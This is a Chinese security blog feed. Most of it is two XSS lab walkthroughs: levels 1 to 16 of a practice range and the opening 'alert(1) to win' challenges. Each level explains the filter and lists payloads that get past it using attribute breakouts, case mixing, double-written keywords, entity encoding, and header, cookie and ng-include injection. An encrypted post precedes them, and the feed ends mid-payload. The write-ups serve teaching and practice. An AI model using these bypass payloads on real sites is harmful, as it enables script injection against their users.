3f7f400ad2f65b7c5d092ad82e0f609aaa8474c04575e94ecbed6b6beeca0e086df8b85c5025fabccfffaacb50abd0728765fa972261be45c4e7a33d0f895fe6ceacb8a36d29164a76718973a51ca49ea6ab5b0a9c55e79a86e5827abee1ef54dc18694ea0a96a93f16b8cbf019320d35481a6364773c8ade9cbd377db671f6b5c017280dbaa55d644650ba760e831c1f2b00f3972e6e4e4377704a3c90b9715e116f6b3fda745d6dad0650d2929071607e7c26d6ad2cc4101075ae0300f5bc6619656ce255b299b6b6b11257b812232678e7cf30833c22c64ccf2a95641d0fa75a8029d07b5d971e39576f8dec0886e4891a435e912194d97835cec633ea6d4053ccd132d33d4d0f4b37d680d56e88830eb0520211e109a72fd7c19511fa1037d6007ccf2f0907657439c7468868bfffc1671dea1f1aab0cefc73d915aec1ce8cc89ddb8eb23b0a1261664d76765e25816412618c3421fc511e4c7830c3aca6a5ba368adf9f99fc935784f44777047383bbe6d29c3579815df92f5fca0ce6ad9f0aa386ad6bd97ca52a572cd5c1d7b6e0d62c211b9bf45351cf8d300cb78350efdeae426e7856ae08f7e122309f57919c9ef87256c13467b78202345d73365eeb49e8839b1da7540a34c2fac40a49990ac7b61d0e5a8a695947b77a4849ac1c25084293f0f0a6d1876473932bc21f498202b3288e6fcb8fb5c770c41ad509d91cb5e15400df5b96f38d858afe0922e5f9b0ee8897082feef244b34e00fc1252291c9609331dfb48a34c2b188117f2d5b0d7195cdd4a256f750d34ec126736d7b19c5fb0199d43dce0a21b0bca8de90e4d4b05afb61a36dcce07d1a2c7983c29f887df6f72b9be997987fa9b03a16959b6c47ad3152c87761b92b0748bd1775651cc51563efa1cc85790afa858f131638560b25bb5ca8cd985b9db63b6fa1f26161b49e7286b6729450918a129c82ae8525c26e7c3fe8dfb742a9055adcbde5ca9372aae91868c25799df8f3238a0d4d58d177076ca24ffb7f94058e28fcd7ec36ef617606cba8b61f511cd60e013517d1e01df400d4c35693ce05d698fc00ef118912d63b5fdd720b026fe1bfb759fe8134a3679499e66bc04d89793d8572bc8226243d2350b1526230c6a0621bc5eaf933f6e30afcf606643b0dcdd993eab493bf366e16b71b642ddbb0fa45f3310b71e3181c4130201c2c4429cba614a66187b2e3a04e9bab9720d311490734975b3e08a38ed412cf4543598ef0ac23dd156ecebd0e5f220a05e335c6b0f1eda4b93aed77521b98a20245c88540c470ded5f51e6d478f87262c8a30938edcabb34c1077b8b91a488637dfb186e1a961b3d519afcd3726a0c0ca94ab17506d8ddb46f8f0f3d7892c26916ec7a9b543f6127bcd61c11069fd4b05e07200fccde46ad4129ea3c3eba0c95241a34da7abdaf1ad7df990c7908294b35eb60d28f26aeaafdd03a3d97befd5f5625f70dff81d2b388f33e9e11a525c72700d492c3b30e884a6c8a45224e4da087c5c3bdd7eeb310f96dcd802d278b9286d3bc3592a208ec61c76adba9897b0b10e8dfcf1e7ed78de8b66866b9e04dde4171fbdc548e7a0860a1250caf3b1255ee784ad3f47a7d1b90574aced85c1adef1c42e64d6153385024644e7ebb937cfa1bf2e8b271594c579955407f4bdb9a1d8cd4f081c926d57e4a473e93e471ca4a7e02e69c215568c8cd885635e16a60686ee68a8afca8304337fc294fd006c3c80c1e6e2182f3b34a744cef68f20936df9a694425d4d6d7db59c44f371a1cab38a3a1d1f131147ca9fb72eab206db9a2b9bf42daba9e58bf8c3ccaa75183fa34b835111689a995cd6b70812d592cdf29cb9ab3304634fd4212be0a71319780daf7c826c5ea0cf02110fe3b22b80ac71bfad0768c331646d2dfc0ca1e0a63868ee5731273fa9eedeb66a91b7b18c9c83fdad2633dfac9f9b3baa4477e8e2d25999060b0e33070f1694e7ebd3bc1fe34e3b6902b9dec3c3c7f5a2c55fb00b80a76026d2426ec9e2f0724fa0c309f824ae0d81311cfa98cf237b37ceb8055ea1fd0fb2ff2a857d0e080c176aad3d898a86e81bd36417e3424539b9c650836b6d5ae1037c68b45ea54b7b18d986fe154b09c10253101a7e5f3f01d6b37dedf42278bea61a6615a38a2e29f3fc3675944ead78f812b10a3cfb2d3d47c1e3dbedb274b3f9820717bbce0125d85376a993156d67867c45ad9abd61432df04bd1568248c2bd8ddaeeebe9737fbb195e732bce39a89d4e374c4927e3ca3e2cf2f0b2bf6996623490db00f4402b938e7394125d0eceb41ff935d7fcceec149bc9e42ef694be86e11619c6f4a152743839f2b84ea93b925851cc5d537c80834b667d5a67682b348647f76d987715a78f85725b7b68860bccc05c93e9a0da5748444fa5131127decccfd01ecfcd81722ffa30cfabc451768b5b0df21024dc4f510c3c2d08361319e18bf4fd23faa5fade21b83b2c7ee25b6dcb37f411644659e5c6bb360ff85317c1e473ef53361d1bd19adb1977616668abebab42036d62ea4a007ad9359411504eb9eea09d33fb72de21b8d4567f60b3e59ba6a42825e55ba2b7a1e744f23dcb214d23861d3d5dc4b917211289fd3ec400638f3719994846f83c9b9cd6a997d1f716aa545b02184437b379c54ad35a470e4ab82b1c637fe7b682181bccafd48e9bdf186502dee60487b1ad7ccd48c4d3ccf1ead919aefefb7919cccc720cce40eb29ee8e1d9b878fbde7fad2d1b7cf9f1e590c99a8a57317bff4d05802d9927d4126e73c73a21942a321d9e55db1baab75091bc05bea6e7919efb8092161c2edfe6b417f3100707f002f60fcd25b2ad76951b4a647893339fe9279c1cc3ec0f6d3967be4cc0973aebc32de4f5691622480857ac4a497430db01da0b5bd828f83de6cd37a114690f471cc428ca0927444a682a1f71fb0aa3fc92745e839cd2a8ef7686e2c4104a072d45e4656118bca9a19138eb0323ca9614943b0168598d5a780c0b621023d5f36382a9dd6d923eac52e4bb521c330191e28b7c7214723230e271a5e6a12ca007040f73e9685c601c6d0d3afae7b98af0988a0179b0557fc4cabe60b8ef293edbdc7d62df744fe2bb4275113ddefa0a80b0d7df47868bec8ed64a010917b1c5b1521cf1277c2f87ec8fc06a826422f8b45ad5e4bc8cac49ea69944828ebaaddf4c9207ad382c643876a9fda98c511d5c153f5d80d510f2b9de32ed29209b98c8d66ed1b38341d7352f01512de3747110191ceb4195cf2e61afc2c961bb746a3b0a184f51e25585d095c1a4d45d4285c0154a598d79a00fb1330b569819eebf565b70d72ab69bd1fbc02aa36463a022f192b85b357082907a50841e5bb3ff3a68364700d6093809a5b2ece18abbdda0afe8e0cdcfcbeae7a3f302942df4ff846fad47d398c1e93fa55a8ce99e4a88670612bb457ccfb4fd0f2bee3d29ba49e9e48eb33cde7cd8835eb6a91ee49193df89df543443bb84ed57490338fd64200bae971c74fa8d90e60eea11d779957c4ce122066b8c1756a2ebb6dd288c61e7a40507c38196f2cabbb0f1b9ffef5e2576ec4007ffcdd70f097140fa1fb91dd012c9a45d9445adb81bf08c231f51fdb42a4fd9ff33109a595ef2f8143a3ff07efe9a8b6d77075fad588afb3406d4b1b2edd54bdeeb2cf61c4a584145cd51ad094dc3383bfe48f646205fc91e8ff3f145129713fb392349b7ecfb28032bc6e114d882c3bd79f68a6baded464fa291eead3fef1ae2283662cc78e05e67260c6c47a3bb26dc9c625e4f43954a78fd2578b70bba17c97951d7c157441e7b31be256a11f734972661da95bc963c59d5104151f3cdb8fccc329f5819c97cbaaf03131639396f44049c52be2ac902f96092819401b27ff7bfc1abf159f775005b6d3dea224690054f2cd045ddc9d127c1897f608354c653e36bbe8b636c522f52570dd4be67a298639759b85a6c7072dea27b4f97a2634933e0a8747c3cb139d293de8c4ebe38dd68d70a8954ca16fc5fe95934ed27bca7cc21423194a009be19c9f35618bbba62f86fd80cf160e46a4c4c721963e27ab374cba3ebac12c97da3a17e68947ccf205251d808499f4870220bc72e43799e2355c79f06eb0ade93ff9d18376c005b37d7baf6de4c0c06bfab4edecbabc28553ebce50fcc880b512d4bcc7c4f48f1a567393edfdf4cf33a99e1cf528c00322067ee15dcd64b78573758d3dd24db393b5ca2fe5f39927cd8159d8b68ed3bc60c8f235b5f2f059adf7f1dd3f7345d7879aeddefb9f4c8a1de78229e1b635da4d3b9f607e748e965799244a17f8579bea5239b6f9e9039470dce347bad63c2cd2e1dc05b893aa6fb58d7e51dc06105c0bcc87a59b91c553d471ab3cdae1a732c9ed7dd7e4754b3e48827d28d13588749b81d4e935452f92cf5a2e2c0de8730a5fb300f858fca3369dc3a53e92bdefd0db7c33d593ece8be34324691d28953df09c00134d3806d9ff9bece8bc6d600223dd67c61834f61f7a862a31e9ab016a62acd97231a83d4161dbc6c092b625e7bd2f0d9c0eea9d88961de37618bb71446934d15f450832f2f82c54d52a7821015d75c82fa96fe46a9560190296522e52d8f629a3f3affbe6d72e3dbec6c5bbfccd0de5bf391ccfdbd77a5f0e23a37409f0535e7f39a6cd8f64f4c0c490f11d62d01eecdff66eb2819f007c4d9018c1c83cdc80df794c5e9b1285cdd4843478359e38a76858b613d0c6e810c95808e8fa238770f35412b8538066feaab48fbf199d87a9cfbc7f9c68554c3249311a819843354bf232008547901bc295c4a86cfd189b28e267c24ab8a9f6e094cbaaa205a6e79ef40ef851c5d5fd4d10e87b34742601ad325ef0c230ac4ef34be5e66a71a45745592f068e108bdd70eebfaaa8505bce441d5e02dd9cd81a376808be0714ee3ea37d3e9582b01e123a4038217d04434aa7e841b911e4bbc12dd1d6bc3320da495f9e0dcbddc03a5be7bc3a043fc2bf93944428f691418f3ccb68eb0b9297a36e0deb9c9531ffc744780dbc30af36e1416125432c00dc6257a1e8fac88263a743219318b2c779f53ad9619fad9a4f14169c5a2a25b13cdce2c44c6c8cd5eadb23c71d1ec48e00c817a793621211233fc18b4b37b5432b6ab795cd8a508b4bfac3ab484f7fc6bad35107dc7fc1ee53dcf9837cce95d1a6051beb588fa52fe22d603c5dcc7367189dba0b267a10f95801bb47552ad989876eb6ad8232cd0a441a0f342bc5a709093a509c6e1e467679267b02f250508386a785d3b9faf63de757a3f3b923991de38f040eae518be4df4e861fdb06fe524ccdc3f52504e3a063907158be896d6883245aa9dad58b3cb61e2fadab59403ad82bac7cd693da4261c8eb8617d5087a7d77760b87cb5d96b7f1e9a524da87d9637335eb096a5f1b585eb97c41b8d7077122731d0a215f5813dc41692287fcb2fb14ba809965abbada9b8b6eb74778476c2cc22c5694a126a797440cdd5e7af07675ca80953f9659ec20d707a98460f9c92de7939acfee308acdeb7e9a64f7f7ca7656a0ff4f58fd8fa0169d09f0f34ea5830e1faee7c647c37b7759ea8d1c5c1e8fa9f14e05a11263420f546139e00716a49e7d950241dac2219022b3cdf5f238de8bdd2760bed76fef4eec5262a7410a1381b5327ac5beeb939486e5bbb455df20f4c3cc72ec25a2b3213fd36e17b92155e87151b8c96da613569bb0c372d06629015702647ef20e0a18ad19caeec30e2a3650d11a93de9693b9403987b6873cbcab2aee6618b20bd6f9989ce2d89d0e8514c35f6bf532f899833230e415c89c19a6ad64ae78a5bde9d64274486b18e1b2ec78aa384fbb41ebde596592027925fcce7d124b09a23577185ea7fe2924bc50d49400ae0ecfc541b0229426813aa238a681c321ac751ad557732d9383652f199a7b6187a472677f4ec5aeabfbaafc1194f59434f8337e8656e62c56ce67219648522c9e84b4229060be041efe41d93984cda66d53d66fa96f93fd825d9625589561b5aa6007058908b1b35ef89d355179ccafdb6c2844089beb97df20da4da58c7d1bed15daa529e5e9eeaf9cf21949878b4f98bf79180d399362cba3fbcc1e460f8269b387a1dc4d91eea3035e3b3ca423937c5090899b46b115d2acc80fb8ea156331e35780489ad49906cdb9be2607f9f9559013a8b9fe190166e844115d327323ed0dabe5ee947268edcde9ff8afbd756e681599c55d83c80b770a08f34966470103b438fb2495b89aab47be79da459f7f4df8a4a2fcf4ec5995eb4c8b51af58123afb9c1ede3e78e8fb676136de06b229c96b62bbcb754390af09648a403156363af142308a4b43962dfc38e202142185ca8b31497fd4a1dc7834efc773071040d49f4b7290058fd564aa0396f363522b57373a6ca125bf597ffd856d6e17e7e96a15af9144bacd5e52876b319648d970c59f4c1b78a0f60dcf8d090ff08705fda0dd8f8b9e4500c8863f09e2cf0007d28233827ae027c2bdceb4d1e5d1ed46d669a9b7a5b9270acf321d13bd8f6cf513110f8e3056a2e59fc5de22991b07a645ddd59421734768d426ae87eea8f54caf53a42d11fd0b101da852cf74e1239cd8ebf71f6d12456b505e342faa68c53dff317669427b678d5987a028be6f78bc572c6646da1657443d963eb17d05c60b5e305d8edd273329cf9702c186ecc26ab689dc3144942d2731b96c36bcba77285c5434543ceba91f85dd0852fb4142e2bff94637185b083fc1a811aac536643c6a1e736351b301362f88543ca688ee99c2f1755a4458703f72291dc4a87921ed9987f7157aec625219815cfb634dc5c74a4704824395268d978b45acfbf9dc98498e4c18401c32c02853850efd8a8f87f9f85294f4d9115abd44d98e8c5e1cfc5806c36fe91ecab01962c4ceecab69e20da0427cc289ce6411742f418f769b4fe2f0746842b910476fe47f2ff86b14305035a279844c38f20df77a6067fb250190fbc9d466046765003c0a7a3a604ae48bff12207857689ddd950ca90eeed33188aab27588c0bc50a24ebcac1ac8494277b8e7490da2e3153fd347f6972faf4d6d3ba4e14e00ad80175050d3072871c47405025ae170f256de590e8abf907365440cfd1ea894ea30628a0d9a2e36c13c4420bfaa1f2427fa01a10348d4048c71988cff22370ef27d4c1f53177d24696cca0c9f928f90ab5519e9664e009c059252aab1cc945b07e5af09bf807aedd97a2e2a6440bd9343b67de6dc8fbfae3d10c29b022eb3d0e58f29715c1e8af08dce4566c34f783e55366847c2f82b65ce74842f58e8c8cd799bf4ccc7511d994b9e4f2e518fe8e84d7c2d00b9080753400ffee103f24362b1ec43035554b98924f0cf113a9d35c8f70c062978cf59179b22fb9f3374ad1eb8784793cac88a3f42218d5ffeb0380019b79310679db590e971955de541c4912ba88257c7ea9a7ebf9ea2e001d2fa4c5d302e8dec4f8cf75c96f49bddab30fbcb432266a475b1f414439b4125a049541dd62528c8092f3c14c40b6f2b7d5394b618d4dd9519f1e4ff2ef263170d36b1cc3d02c7d6b71e70eccb51d8da7864c9f6c880612ef5c84016b0024ce395cc37c489a64cf7fb69b9a05df6b66f812e509f769b1e23d1443ccb98598039cfe763914fcfb7d0fea778efddcc9e808daa81ffc2747ee9cc5747f0f986ae66b5a038ae5838c51f4dc5d135e7617a48bf82e1afdb9026a2999d0fa0b8fd4bd2eeb7ef4cc58b7b8aed791408a26534d1fca1b9905ae2650181b0204c9e596e58203983b7f92e3d551b3e75d660c9b084a2fc90e48532cf3e4223a10840466abbda1a6a7622f591fc53425530b8407ab6c8ebad7582185d6b77f988c32c39fc7302d8c1827108ee3541994ed723115d626abe1a19a660ff7a9a795acbe71b1051c3e822d820dbc2942a2a7a392ff9f9aac574dcf6ac6134a76955799576a4f81c225dec59d8c3eee0a6558a8c2357809ebdb3294e5d3ad7931c7bdc86129853e781c2f1</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码，查看文章！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码，查看文章！</summary>
    
    
    
    <category term="漏洞复现" scheme="http://lvpsectime.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="http://lvpsectime.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="CVE" scheme="http://lvpsectime.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>XSS靶场练习二</title>
    <link href="http://lvpsectime.github.io/post/6855.html"/>
    <id>http://lvpsectime.github.io/post/6855.html</id>
    <published>2020-05-04T09:39:19.000Z</published>
    <updated>2020-05-04T13:08:57.300Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="http://test.ctf8.com/">http://test.ctf8.com/</a></p><p><img src="/post/6855/1.png"></p><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>name变量通过<code>GET</code>方式传入，直接带入到标签中，没有任何过滤。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>将第一关的payload带进去，发现输入值被原封不动的输出了。查看页面源代码</p><p><img src="/post/6855/2.png"></p><p>发现输入的<code>&lt;、&gt;</code>被<code>html</code>编码了。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>输入点(INPUT_POINT)有两处，一处在标签间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=&quot;center&quot;&gt;没有找到和INPUT_POINT相关的结果.&lt;/h2&gt;</span><br></pre></td></tr></table></figure><p>另一处在标签属性处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;INPUT_POINT&quot;&gt;</span><br></pre></td></tr></table></figure><p>对左右尖括号<code>&lt;,&gt;</code>被转化成<code>HTML</code>字符实体(HTML Entity)的情况，想直接构造标签是有难度的(宽字符构造尖括号?)所以从另一处入手。<br>输入点位于属性内，所以闭合属性并构造新属性，基于事件弹窗。<br>(然而如果输入点对&lt;,&gt;,’,”都进行了字符实体转换呢)<br>(构造标签的关键是&lt;,&gt;, 闭合属性的关键是引号)</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=alert(1)//</span><br></pre></td></tr></table></figure><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>和 level 3 输出点一致</p><p>只是level 3中<code>value=&#39;&#39;</code>，而level 4中的<code>value=&quot;&quot;</code>，所以要闭合<code>value</code>上面要用<code>&#39;</code>，此处要用<code>&quot;</code></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert(1)//</span><br></pre></td></tr></table></figure><h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p><img src="/post/6855/3.png"></p><p><code>on</code> 替换为 <code>o_n</code>，<code>script</code> 替换为 <code>sc_ript</code><br>因此不能再考虑用事件触发，也不能用<code>script</code>标签触发。</p><p><strong>payload</strong></p><p>此处的用<code>&quot;&gt;</code>截断属性，再用a标签触发<br>关键在于虽然在h5的内容过滤了，但在属性内未过滤<code>&quot;&gt;</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=&quot;javascript:%61lert(1)&quot;&gt;click me&lt;/a&gt; //</span><br><span class="line">&quot;&gt; &lt;a href=&quot;javascript:alert(&#x27;xss&#x27;)&quot;&gt;111&lt;/a&gt; //</span><br><span class="line">&quot;&gt; &lt;a href=&quot;javascript:alert(/1/)&quot;&gt;axxx&lt;/a&gt; //</span><br></pre></td></tr></table></figure><h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>在上一关限制的基础上，将所有的属性，如<code>src</code>、<code>href</code>等等都进行转换。</p><p>此处可用大小写混合绕过。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a Href=&quot;javascript:alert(/1/)&quot;&gt;axxx&lt;/a&gt;</span><br><span class="line">&quot;&gt; &lt;Script&gt;alert(&#x27;handsome boy&#x27;)&lt;/script&gt; //</span><br><span class="line">&quot;&gt; &lt;img Src=x OnError=alert(&#x27;xss&#x27;)&gt; //</span><br></pre></td></tr></table></figure><h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p><code>href</code>, <code>on</code>, <code>script</code>等关键字被删除了。</p><p>此处可用双写关键字绕过</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; oonninput=alert(1) &quot;</span><br><span class="line">&quot;&gt; &lt;scscriptript&gt;alert`xss`&lt;/scscriptript&gt; //</span><br></pre></td></tr></table></figure><h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>属性中双引号被转换成<code>HTML</code>实体，无法截断属性。<br>由于<code>script</code>关键字被过滤，得考虑绕过方式，使用<code>HTML</code>实体字符绕过<br><code>HTML16</code>编码<br><code>HTML10</code>编码</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(/1/)</span><br><span class="line">javascript:%61lert(1)</span><br><span class="line">javasc&amp;#x72;ipt:alert`1`</span><br><span class="line">javasc&amp;#x0072;ipt:alert`1`</span><br></pre></td></tr></table></figure><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>提交参数中必须要有http关键字</p><p><strong>payload</strong></p><p><strong>记得替换<code>script</code>，比如用<code>&amp;#x72;</code>替换r</strong><br><code>%0d</code>和<code>%0a</code>,<code>/</code>等有时具有替代空格的作用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)//http://www.0aa.me  //利用注释</span><br><span class="line">javascript:%0dhttp://www.0aa.me%0dalert(1)  //不能用注释的情况下</span><br></pre></td></tr></table></figure><h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>可以看出这里<code>keyword</code>变量依然没戏，被<code>HTML</code>实体化输出了出来，所以重点放在<code>t_sort</code>变量上，只过滤了尖括号，然后就直接输出到了标签中，所以这里可以尝试直接在标签中闭合构造事件来弹窗，还得注意一点就是这里的标签使用了<code>type=&quot;hidden&quot;</code>将输入框隐藏了起来，可以手动赋值<code>type</code>的值来覆盖掉先前的属性来达到显示文本框的目的。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=233&amp;t_sort=&quot; type=&quot;&quot; onclick=alert(&#x27;XSS&#x27;) //</span><br></pre></td></tr></table></figure><h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>与 level 10 类似，寻找新的注入点。<br>原来的<code>t_sort</code>的双引号被过滤了。<br>这次注入点是在 <code>HTTP Request Header</code> 请求头的 <code>Refer</code> 字段。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; type=&quot;text&quot; onmouseover=alert`1` &quot;</span><br></pre></td></tr></table></figure><h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>这一题和上一题类似，只是这里的漏洞点出现在了<code>HTTP</code>请求头的<code>User-Agent</code>。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &quot; type=&quot;&quot; onclick=alert(&#x27;XSS&#x27;) //</span><br></pre></td></tr></table></figure><h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>寻找新的注入点，这次是利用<code>cookie</code>中的参数注入。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user=&quot; type=&quot;&quot; onclick=alert(&#x27;XSS&#x27;) //</span><br></pre></td></tr></table></figure><h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>看了先知的wp，才知道是图片exif 藏有xss payload。<a href="https://xianzhi.aliyun.com/forum/read/1462.html?page=2">https://xianzhi.aliyun.com/forum/read/1462.html?page=2</a></p><h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>这题考察<code>Angular JS</code> 的<code>ng-include</code>用法，具体可以参考这篇资料：<a href="http://www.runoob.com/angularjs/ng-ng-include.html">AngularJS ng-include 指令</a></p><p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。<code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以这里就用来包含其他关的页面来触发弹窗。</p><p>发现可以包含第一关的页面</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=‘level1.php?name=&lt;img src=x onerror=alert(1)&gt;‘</span><br></pre></td></tr></table></figure><h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p>这里过滤掉了script标签，可以尝试使用其他标签通过事件来弹窗，但是也过滤了空格。</p><p>可以使用如下符号替代空格</p><p><img src="/post/6855/4.png"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=&lt;img%0asrc=x%0aonerror=alert(&#x27;XSS&#x27;)&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://test.ctf8.com/&quot;&gt;http://test.ctf8.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img </summary>
      
    
    
    
    <category term="WEB" scheme="http://lvpsectime.github.io/categories/WEB/"/>
    
    
    <category term="XSS" scheme="http://lvpsectime.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>XSS靶场练习一</title>
    <link href="http://lvpsectime.github.io/post/32710.html"/>
    <id>http://lvpsectime.github.io/post/32710.html</id>
    <published>2020-05-02T12:54:12.000Z</published>
    <updated>2020-05-06T02:22:51.963Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶场地址：<a href="https://alf.nu/alert1">alert(1) to win</a></p><h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span>+s+<span class="string">&#x27;&quot;);&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>代码将输入直接拼接到了返回的字符串中，没有任何过滤，直接闭合<code>console.log(&quot;</code>即可。</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">13个字符</span><br><span class="line">&quot;);alert(1)//</span><br><span class="line">12个字符</span><br><span class="line">&quot;);alert(1,&quot;</span><br></pre></td></tr></table></figure><h2 id="Adobe"><a href="#Adobe" class="headerlink" title="Adobe"></a>Adobe</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s = s.replace(/&quot;/g, &#x27;\\&quot;&#x27;);</span><br><span class="line">  return &#x27;&lt;script&gt;console.log(&quot;&#x27; + s + &#x27;&quot;);&lt;/script&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><img src="/post/32710/1.png" alt="replace"></p><p>代码将输入的双引号加了一个<code>\</code>进行了转义，这样我们就不能像第一题那样闭合<code>console.log</code>了，但是没啥影响，有两种方法：</p><ul><li>闭合之前的<code>&lt;script&gt;</code>，然后再写一个<code>&lt;script&gt;</code></li><li>使用<code>\</code>来转义对<code>&quot;</code>进行转义的<code>\</code>，从而绕过对<code>&quot;</code>的过滤</li></ul><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">方法一</span><br><span 